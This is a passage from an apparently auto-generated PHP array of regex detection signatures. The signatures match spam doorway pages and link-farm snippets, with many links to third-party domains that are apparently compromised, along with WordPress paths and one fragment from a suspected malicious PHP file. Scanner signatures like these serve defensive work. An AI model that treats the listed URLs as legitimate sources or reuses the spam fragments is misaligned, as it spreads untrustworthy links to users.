      'pattern' => '/\\>Google pixel keyboard settings\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    967 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/ruvelservices\\.com\\/00qt\\/bengali\\-wedding\\-tatta\\-list\\.html\\>ld\\<\\/a\\>, \\<a href\\=http\\:\\/\\/tienluat\\.com\\.vn\\/cj08\\/2003\\-silverado\\-cranks\\-but\\-/',
      'label' => 'source-file tail snippet',
    ),
    968 => 
    array (
      'pattern' => '/\\>

 



  

  

  \\<title\\>Adobe rush apk for android\\<\\/title\\>

 

\\<\\/head\\>





\\<body\\>

\\<br\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    969 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/navellier\\.com\\/wp\\-content\\/themes\\/guava\\/vqle\\/pvc\\-pipe\\-size\\-chart\\.html\\>hy\\<\\/a\\>, \\<a href\\=http\\:\\/\\/lalucozyrooms\\.com\\/fwpvjyj43\\/i5\\-825/',
      'label' => 'source-file tail snippet',
    ),
    970 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/denizisisag\\.com\\/zzhrhooa\\/cdr\\-viewer\\-app\\.html\\>6p\\<\\/a\\>, \\<a href\\=http\\:\\/\\/cbdprom\\.com\\/cfuxx\\/bugcheckcode\\-239\\.html\\>sq\\<\\/a\\>, \\<a href\\=h/',
      'label' => 'source-file tail snippet',
    ),
    971 => 
    array (
      'pattern' => '/\\$?nSunsrecommendations\\b/',
      'label' => 'sample-specific identifier',
    ),
    972 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/topkomment\\.com\\/xaq1qg\\/hits\\-1\\-songs\\-2019\\.html\\>uw\\<\\/a\\>, \\<a href\\=http\\:\\/\\/khakshah\\.in\\/vivng\\/it\\-roars\\-sheet\\-music\\.html\\>xi\\<\\/a\\>, \\<a hr/',
      'label' => 'source-file tail snippet',
    ),
    973 => 
    array (
      'pattern' => '/true"\\>Technology guest post guidelines\\<\\/span\\>\\<span\\>\\<\\/span\\>\\<\\/h3\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    974 => 
    array (
      'pattern' => '/\\$?UpdateFirmwareAndroid_withiOS_2_ymL5srw\\b/',
      'label' => 'sample-specific identifier',
    ),
    975 => 
    array (
      'pattern' => '/content\\/uploads\\/2019\\/08\\/mn8mnt\\/elastic/',
      'label' => 'sample-specific encoded fragment',
    ),
    976 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.dunyamantar\\.com\\/kkm\\/62\\-bat\\-turn\\.html\\>os\\<\\/a\\>, \\<a href\\=http\\:\\/\\/test\\.mobyte\\.es\\/raooe\\/corruption\\-of\\-champions\\-mod\\-image\\-pack\\-a/',
      'label' => 'source-file tail snippet',
    ),
    977 => 
    array (
      'pattern' => '/\\>

 



  

  

  \\<title\\>Nava maratha newspaper ahmednagar today\\<\\/title\\>

 

\\<\\/head\\>





\\<body\\>

\\<br\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    978 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/scholar2020\\.space\\/vgigq\\/recruitment\\-matrix\\-template\\-format\\.html\\>hk\\<\\/a\\>, \\<a href\\=http\\:\\/\\/augur\\.com\\.au\\/j8ox\\/latest\\+\\-agesa\\.html\\>d/',
      'label' => 'source-file tail snippet',
    ),
    979 => 
    array (
      'pattern' => '/\\>

 



  \\<title\\>Where to find geodes in colorado\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal',
    ),
    980 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>

  \\<meta charset\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>I2s tutorial\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    981 => 
    array (
      'pattern' => '/\\>Mercedes e400 tune\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    982 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>

  \\<meta charset\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>Cube 3d cartridge hack\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    983 => 
    array (
      'pattern' => '/true"\\>Index of the mist\\<\\/span\\>\\<span\\>\\<\\/span\\>\\<\\/h3\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    984 => 
    array (
      'pattern' => '/\\$?Porcupine28\\b/',
      'label' => 'sample-specific identifier',
    ),
    985 => 
    array (
      'pattern' => '/true"\\>North korea server\\<\\/span\\>\\<span\\>\\<\\/span\\>\\<\\/h3\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    986 => 
    array (
      'pattern' => '/Marshall county daily obituaries/',
      'label' => 'sample-specific literal',
    ),
    987 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/dunlopillo\\.firstcom\\.vn\\/znvoqelq\\/bimbo\\-bread\\.html\\>s5\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.k4dassociates\\.com\\/7twe\\/what\\-is\\-activity\\-in\\-androi/',
      'label' => 'source-file tail snippet',
    ),
    988 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>

  \\<meta charset\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>Curriculum calendar template\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    989 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>

  \\<meta charset\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>Trade school vs college reddit\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    990 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>

  \\<meta charset\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>Omid royal reporter\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    991 => 
    array (
      'pattern' => '/\\>3d brooklyn instagram\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    992 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if IE 9\\]\\>

\\<html class\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>Coyote mix\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    993 => 
    array (
      'pattern' => '/content\\/themes\\/guava\\/rwqumw\\/unlocked/',
      'label' => 'sample-specific encoded fragment',
    ),
    994 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/lalasagnarestaurant\\.com\\/31l\\/airport\\-telephone\\-no\\.html\\>ma\\<\\/a\\>, \\<a href\\=http\\:\\/\\/figtreeaccountancy\\.co\\.uk\\/045\\/unfortunately\\-media/',
      'label' => 'source-file tail snippet',
    ),
    995 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/231bain\\.com\\/e175yw\\/file\\-management\\-system\\-pdf\\.html\\>gj\\<\\/a\\>, \\<a href\\=http\\:\\/\\/figtreeaccountancy\\.co\\.uk\\/qfrd\\/essential\\-oils\\-after\\-/',
      'label' => 'source-file tail snippet',
    ),
    996 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/alfaefe\\.com\\/pghtd\\/macbook\\-mdm\\-bypass\\.html\\>yr\\<\\/a\\>, \\<a href\\=http\\:\\/\\/mytraveldealdiscount\\.com\\/o3mq\\/tencent\\-app\\-store\\-english\\-apk\\./',
      'label' => 'source-file tail snippet',
    ),
    997 => 
    array (
      'pattern' => '/Art model 3d pose tool and morphing tool mod apk/',
      'label' => 'sample-specific literal',
    ),
    998 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/fortune\\.icreativelabs\\.com\\/qwan\\/bolt\\-ceo\\.html\\>mq\\<\\/a\\>, \\<a href\\=http\\:\\/\\/minhthanhbds\\.com\\/ad6q\\/gold\\-dragees\\.html\\>jc\\<\\/a\\>, \\<a href\\=h/',
      'label' => 'source-file tail snippet',
    ),
    999 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if IE 9\\]\\>

\\<html class\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>Textron login\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    1000 => 
    array (
      'pattern' => '/\\>Sngpl test questions\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1001 => 
    array (
      'pattern' => '/\\>

 



  

  

  \\<title\\>What is smart download in adm\\<\\/title\\>

 

\\<\\/head\\>





\\<body\\>

\\<br\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1002 => 
    array (
      'pattern' => '/\\>

 



  \\<title\\>Best bb gun for 10 year old\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal',
    ),
    1003 => 
    array (
      'pattern' => '/content\\/uploads\\/2019\\/08\\/oqo\\/grade/',
      'label' => 'sample-specific encoded fragment',
    ),
    1004 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/egkpainting\\.com\\/uhgt\\/reddit\\-400k\\-salary\\.html\\>zn\\<\\/a\\>, \\<a href\\=http\\:\\/\\/lifewelluniversity\\.com\\/o3ex\\/facebook\\-old\\-logo\\.html\\>qs\\<\\/a\\>/',
      'label' => 'source-file tail snippet',
    ),
    1005 => 
    array (
      'pattern' => '/\\$?EsotericKnowledge\\b/',
      'label' => 'sample-specific identifier',
    ),
    1006 => 
    array (
      'pattern' => '/\\>Walmart gun sales statistics\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1007 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/loyalfrench\\.com\\/w079bt\\/sgic\\-contact\\-email\\.html\\>pd\\<\\/a\\>, \\<a href\\=http\\:\\/\\/fp\\-togo\\.org\\/2xaq7mcjez\\/jupyter\\-lab\\-nodejs\\.html\\>gh\\<\\/a\\>, /',
      'label' => 'source-file tail snippet',
    ),
    1008 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/moscow\\-medicine\\.ru\\/85wjds\\/vue\\-dropdown\\-menu\\.html\\>bn\\<\\/a\\>, \\<a href\\=http\\:\\/\\/cbdprom\\.com\\/cfuxx\\/zoo\\-tycoon\\-2\\-animal\\-downloads\\-free\\./',
      'label' => 'source-file tail snippet',
    ),
    1009 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/loyalfrench\\.com\\/w079bt\\/osha\\-fire\\-extinguisher\\-placement\\.html\\>oi\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.centromedisalud\\.cl\\/tz6x\\/peruvian\\-cand/',
      'label' => 'source-file tail snippet',
    ),
    1010 => 
    array (
      'pattern' => '/master\\.php\\.suspected[\\s\\S]{0,160}\\.ht"; \\$f2 \\=/',
      'label' => 'sample-specific literal chain',
    ),
    1011 => 
    array (
      'pattern' => '/\\>

 



  

  

  \\<title\\>Ici castings\\<\\/title\\>

 

\\<\\/head\\>





\\<body\\>

\\<br\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1012 => 
    array (
      'pattern' => '/\\>Pix4d\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1013 => 
    array (
      'pattern' => '/content\\/themes\\/guava\\/rwqumw\\/p1729/',
      'label' => 'sample-specific encoded fragment',
    ),
    1014 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.ammahtechsavvy\\.com\\/dxehvxr\\/best\\-fsx\\-freeware\\-aircraft\\-2019\\.html\\>tf\\<\\/a\\>, \\<a href\\=http\\:\\/\\/raghebalama\\.com\\/mjono8b\\/osint\\-feed/',
      'label' => 'source-file tail snippet',
    ),
    1015 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if IE 9\\]\\>

\\<html class\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>Rtings hisense\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    1016 => 
    array (
      'pattern' => '/\\>

 



  

  

  \\<title\\>Stm32wb55\\<\\/title\\>

 

\\<\\/head\\>





\\<body\\>

\\<br\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1017 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/jpc\\.dpi\\.ac\\/so33g\\/non\\-intractable\\-headache\\-icd\\-10\\.html\\>di\\<\\/a\\>, \\<a href\\=http\\:\\/\\/dotincludes\\.com\\/ulynmu\\/how\\-to\\-read\\-a\\-obd2\\-scanne/',
      'label' => 'source-file tail snippet',
    ),
    1018 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>

  \\<meta charset\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>Stamp and coin shops\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    1019 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.lacargo\\.eu\\/rfzh0\\/clonezilla\\-gui\\.html\\>vi\\<\\/a\\>, \\<a href\\=http\\:\\/\\/myins\\.co\\.uk\\/ozcwz\\/surgical\\-instruments\\-importers\\-in\\-belgium\\.h/',
      'label' => 'source-file tail snippet',
    ),
    1020 => 
    array (
      'pattern' => '/content\\/uploads\\/2019\\/08\\/wtmi\\/ijaz/',
      'label' => 'sample-specific encoded fragment',
    ),
    1021 => 
    array (
      'pattern' => '/\\>Cant click skyrim\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1022 => 
    array (
      'pattern' => '/content\\/uploads\\/2019\\/08\\/9odmtj\\/tata/',
      'label' => 'sample-specific encoded fragment',
    ),
    1023 => 
    array (
      'pattern' => '/\\>

 



  \\<title\\>Seeing smoke like mist after suddenly waking up\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal',
    ),
    1024 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/scallion\\-lifes\\.com\\/a5ahk\\/vray\\-plants\\.html\\>k6\\<\\/a\\>, \\<a href\\=http\\:\\/\\/addawasolutions\\.com\\/s0a\\/stream\\-is\\-choppy\\-streamlabs\\.html\\>1d\\</',
      'label' => 'source-file tail snippet',
    ),
    1025 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/welcome\\-forex\\.ru\\/yswzbh\\/john\\-deere\\-850\\-dozer\\-vs\\-cat\\-d6\\.html\\>mo\\<\\/a\\>, \\<a href\\=http\\:\\/\\/africanhumanistcelebrants\\.com\\/0q53jkm\\/visi/',
      'label' => 'source-file tail snippet',
    ),
    1026 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.stachelhaus\\.info\\/yeg12v\\/what\\-is\\-esim\\-manager\\.html\\>kl\\<\\/a\\>, \\<a href\\=http\\:\\/\\/sks72\\.ru\\/b35\\/cre\\-marking\\-scheme\\-pdf\\.html\\>rl\\<\\/a\\>,/',
      'label' => 'source-file tail snippet',
    ),
    1027 => 
    array (
      'pattern' => '/A7 card size/',
      'label' => 'sample-specific literal',
    ),
    1028 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/startupdirectory\\.ir\\/sgce\\/pdf417\\-barcode\\-scanner\\-online\\.html\\>eu\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.k4dassociates\\.com\\/razv\\/matrix\\-webclien/',
      'label' => 'source-file tail snippet',
    ),
    1029 => 
    array (
      'pattern' => '/content\\/uploads\\/2019\\/08\\/cgeqx\\/hotel/',
      'label' => 'sample-specific encoded fragment',
    ),
    1030 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if IE 9\\]\\>

\\<html class\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>Osisoft forum\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    1031 => 
    array (
      'pattern' => '/\\$?alfahydroksihapoissa\\b/',
      'label' => 'sample-specific identifier',
    ),
    1032 => 
    array (
      'pattern' => '/\\>

 



  

  

  \\<title\\>Relion alcohol swabs\\<\\/title\\>

 

\\<\\/head\\>





\\<body\\>

\\<br\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1033 => 
    array (
      'pattern' => '/\\$?Man_VWR_Ion_EN_Rev1\\b/',
      'label' => 'sample-specific identifier',
    ),
    1034 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.chintech\\.com\\.cn\\/hfzvtib\\/softether\\-vpn\\-android\\-apk\\.html\\>o1\\<\\/a\\>, \\<a href\\=http\\:\\/\\/bmvv1995\\.com\\/whdkga\\/can\\-you\\-use\\-stiiizy\\-pod/',
      'label' => 'source-file tail snippet',
    ),
    1035 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>

  \\<meta charset\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>G2o lambda\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    1036 => 
    array (
      'pattern' => '/content\\/themes\\/guava\\/l2azy6i\\/another/',
      'label' => 'sample-specific encoded fragment',
    ),
    1037 => 
    array (
      'pattern' => '/content\\/uploads\\/2019\\/08\\/mn8mnt\\/accenture/',
      'label' => 'sample-specific encoded fragment',
    ),
    1038 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/taysyz\\.ir\\/nbpwk\\/lucius\\-and\\-ginny\\-fanfiction\\-lemon\\.html\\>hu\\<\\/a\\>, \\<a href\\=http\\:\\/\\/tresusa\\.biz\\/nly0mls\\/dr\\-sweeney\\-urology\\.html\\>ar\\</',
      'label' => 'source-file tail snippet',
    ),
    1039 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if IE 9\\]\\>

\\<html class\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>Cadoodle\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    1040 => 
    array (
      'pattern' => '/\\>

 



  

  

  \\<title\\>Wifi booter free\\<\\/title\\>

 

\\<\\/head\\>





\\<body\\>

\\<br\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1041 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/henduconsultores\\.com\\/3i8\\/top\\-10\\-richest\\-pastor\\-in\\-africa\\-2018\\.html\\>of\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.lacollinadegliulivi\\.net\\/4le\\/ela/',
      'label' => 'source-file tail snippet',
    ),
    1042 => 
    array (
      'pattern' => '/\\$?xuqiang521\\b/',
      'label' => 'sample-specific identifier',
    ),
    1043 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.successfactor\\.me\\/uzjh\\/hp\\-z600\\-motherboard\\-diagram\\.html\\>gc\\<\\/a\\>, \\<a href\\=http\\:\\/\\/shrujais\\.com\\/wordpress\\/wp\\-content\\/themes\\/gu/',
      'label' => 'source-file tail snippet',
    ),
    1044 => 
    array (
      'pattern' => '/\\$?SrbijaDOKUMENTARNIJelena\\b/',
      'label' => 'sample-specific identifier',
    ),
    1045 => 
    array (
      'pattern' => '/content\\/uploads\\/2019\\/08\\/qkk2jq8\\/boruto/',
      'label' => 'sample-specific encoded fragment',
    ),
    1046 => 
    array (
      'pattern' => '/\\$?alphanumerically\\b/',
      'label' => 'sample-specific identifier',
    ),
    1047 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if IE 9\\]\\>

\\<html class\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>Betrayal kjv\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    1048 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/cinema21\\.online\\/a9orn\\/new\\-impeller\\-still\\-no\\-water\\.html\\>mz\\<\\/a\\>, \\<a href\\=http\\:\\/\\/accurateopticians\\.com\\/t99\\/dapper\\-plus\\-license\\.h/',
      'label' => 'source-file tail snippet',
    ),
    1049 => 
    array (
      'pattern' => '/content\\/themes\\/guava\\/l2azy6i\\/2018/',
      'label' => 'sample-specific encoded fragment',
    ),
    1050 => 
    array (
      'pattern' => '/content\\/uploads\\/2019\\/08\\/tqsf\\/subject/',
      'label' => 'sample-specific encoded fragment',
    ),
    1051 => 
    array (
      'pattern' => '/\\$?manutd4life0023\\b/',
      'label' => 'sample-specific identifier',
    ),
    1052 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/shakry\\.us\\/ibpv16\\/fl\\-studio\\-pluck\\-pack\\-free\\.html\\>ga\\<\\/a\\>, \\<a href\\=http\\:\\/\\/listingpro\\.inspireui\\.com\\/92comg\\/ultra\\-sans\\-pictures\\.ht/',
      'label' => 'source-file tail snippet',
    ),
    1053 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/new2\\.lepnina\\.by\\/xfuo\\/krasko\\-villains\\-wiki\\.html\\>wd\\<\\/a\\>, \\<a href\\=http\\:\\/\\/reliancechauffeurs\\.com\\/6ym\\/chelsea\\-fc\\-fixtures\\-download/',
      'label' => 'source-file tail snippet',
    ),
    1054 => 
    array (
      'pattern' => '/html\\/generatrix\\/model\\/youtubeModel/',
      'label' => 'sample-specific encoded fragment',
    ),
    1055 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/kukulifood\\.com\\/wc7za7\\/xml2js\\-brackets\\.html\\>fm\\<\\/a\\>, \\<a href\\=http\\:\\/\\/themillsfabrica\\.kcly\\.com\\/luiyy\\/typescript\\-function\\.html\\>rq\\</',
      'label' => 'source-file tail snippet',
    ),
    1056 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/mysmartdigital\\.fr\\/rzy\\/how\\-to\\-copy\\-products\\-from\\-a\\-website\\.html\\>co\\<\\/a\\>, \\<a href\\=http\\:\\/\\/oncohope\\.net\\/vcf5\\/verizon\\-phone\\-codes\\-6/',
      'label' => 'source-file tail snippet',
    ),
    1057 => 
    array (
      'pattern' => '/\\>Add surface information arcgis\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1058 => 
    array (
      'pattern' => '/\\<html itemscope\\="" itemtype\\="" class\\="no\\-js zsg\\-theme\\-modernized null" xmlns\\="" xmlns\\:og\\="\\#" xmlns\\:fb\\="" xmlns\\:product\\="\\#" lang\\="en"\\>/',
      'label' => 'source-file head snippet',
    ),
    1059 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.rprhydro\\.com\\/fpoxqv\\/samsung\\-galaxy\\-s4\\-second\\-hand\\-value\\.html\\>sb\\<\\/a\\>, \\<a href\\=http\\:\\/\\/kaplanpower\\.com\\/dqkftcz\\/free\\-setup\\-bo/',
      'label' => 'source-file tail snippet',
    ),
    1060 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/himmelsbygardshotell\\.se\\/vhfutf\\/glycol\\-ether\\-dpm\\.html\\>gt\\<\\/a\\>, \\<a href\\=http\\:\\/\\/osentek\\.com\\/fw3ec\\/sindoor\\-in\\-dream\\-meaning\\.html\\>n/',
      'label' => 'source-file tail snippet',
    ),
    1061 => 
    array (
      'pattern' => '/content\\/uploads\\/2019\\/08\\/nsd\\/mongodb/',
      'label' => 'sample-specific encoded fragment',
    ),
    1062 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.vgmsteel\\.co\\.za\\/1kkm\\/roblox\\-change\\-key\\-bindings\\.html\\>nl\\<\\/a\\>, \\<a href\\=http\\:\\/\\/pilatestudio360\\.com\\/eqr\\/ley\\-lines\\-egypt\\.html\\>i/',
      'label' => 'source-file tail snippet',
    ),
    1063 => 
    array (
      'pattern' => '/\\>Dynaman subbed\\<\\/span\\>\\<\\/h1\\>



            \\<\\/div\\>



            \\<\\!\\-\\- mainmenu begin \\-\\-\\>

            

\\<ul id\\=/',
      'label' => 'sample-specific literal',
    ),
    1064 => 
    array (
      'pattern' => '/\\>2015 bassmaster lake guntersville\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1065 => 
    array (
      'pattern' => '/content\\/uploads\\/2019\\/08\\/0qv87cq\\/outlook/',
      'label' => 'sample-specific encoded fragment',
    ),
    1066 => 
    array (
      'pattern' => '/\\>

 



  

  

  \\<title\\>Tests\\<\\/title\\>

 

\\<\\/head\\>





\\<body\\>

\\<br\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1067 => 
    array (
      'pattern' => '/\\>Lol season 9\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1068 => 
    array (
      'pattern' => '/content\\/themes\\/guava\\/rwqumw\\/rubberising/',
      'label' => 'sample-specific encoded fragment',
    ),
    1069 => 
    array (
      'pattern' => '/\\>Ballet class music\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1070 => 
    array (
      'pattern' => '/Knife companies list/',
      'label' => 'sample-specific literal',
    ),
    1071 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/decor365\\.vn\\/1fhm\\/powershell\\-force\\-ad\\-replication\\.html\\>dt\\<\\/a\\>, \\<a href\\=http\\:\\/\\/boxblue\\.net\\/kun3w\\/pfsense\\-show\\-interfaces\\.html\\>b/',
      'label' => 'source-file tail snippet',
    ),
    1072 => 
    array (
      'pattern' => '/\\>

            

\\<h1\\>Used 20 hp jet outboard for sale\\<\\/h1\\>



            

\\<ul class\\=[\\s\\S]{0,160}\\>

\\<\\/ul\\>



         \\<\\/div\\>



      \\<\\/div\\>



   \\<\\/div\\>



\\<\\/div\\>



\\<\\!\\-\\- content begin \\-\\-\\>

\\<div id\\=/',
      'label' => 'sample-specific literal chain',
    ),
    1073 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.ardexendura\\.com\\/gdyroby\\/germany\\-spare\\-parts\\-suppliers\\.html\\>sc\\<\\/a\\>, \\<a href\\=http\\:\\/\\/kts\\-kk\\.co\\.jp\\/mnh4uqt\\/adafruit\\-fritzing\\-/',
      'label' => 'source-file tail snippet',
    ),
    1074 => 
    array (
      'pattern' => '/\\>Phone ear speaker buzzing\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1075 => 
    array (
      'pattern' => '/\\>Bats in attic noise\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1076 => 
    array (
      'pattern' => '/true"\\>Windows 10 update assistant 1903\\<\\/span\\>\\<span\\>\\<\\/span\\>\\<\\/h3\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    1077 => 
    array (
      'pattern' => '/\\>2400mhz vs 2666mhz\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

